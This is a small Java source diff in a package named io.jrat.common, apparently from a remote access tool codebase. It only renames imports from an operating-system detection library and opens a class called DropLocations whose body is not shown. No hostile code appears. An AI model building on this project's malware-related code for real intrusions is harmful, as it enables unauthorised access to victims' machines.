@@ -2,11 +2,10 @@ package io.jrat.common;
 
 import io.jrat.common.utils.Utils;
 import java.io.File;
-
-import com.redpois0n.oslib.AbstractOperatingSystem;
-import com.redpois0n.oslib.OperatingSystem;
-import com.redpois0n.oslib.windows.WindowsOperatingSystem;
-import com.redpois0n.oslib.windows.WindowsVersion;
+import oslib.AbstractOperatingSystem;
+import oslib.OperatingSystem;
+import oslib.windows.WindowsOperatingSystem;
+import oslib.windows.WindowsVersion;
 
 public class DropLocations {
 	
